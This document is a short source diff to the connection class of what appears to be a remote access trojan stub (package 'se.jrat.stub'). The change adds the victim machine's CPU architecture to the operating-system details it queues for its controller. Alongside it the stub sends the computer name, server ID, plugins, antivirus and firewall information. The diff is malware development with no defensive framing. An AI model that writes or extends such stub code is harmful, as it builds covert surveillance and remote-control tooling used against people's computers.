@@ -42,6 +42,7 @@ import se.jrat.stub.packets.outgoing.Packet67LoadedPlugins;
 import se.jrat.stub.packets.outgoing.Packet69InitAntivirus;
 import se.jrat.stub.packets.outgoing.Packet70InitFirewall;
 
+import com.redpois0n.oslib.Arch;
 import com.redpois0n.oslib.OperatingSystem;
 import com.sun.management.OperatingSystemMXBean;
 
@@ -141,7 +142,7 @@ public class Connection implements Runnable {
 		}
 		addToSendQueue(new Packet14InitComputerName(computerName));
 
-		addToSendQueue(new Packet16InitOperatingSystem(OperatingSystem.getShortOperatingSystem(), OperatingSystem.getLongOperatingSystem()));
+		addToSendQueue(new Packet16InitOperatingSystem(OperatingSystem.getShortOperatingSystem(), OperatingSystem.getLongOperatingSystem(), Arch.getArchString()));
 
 		addToSendQueue(new Packet15InitServerID(Main.getID()));
 
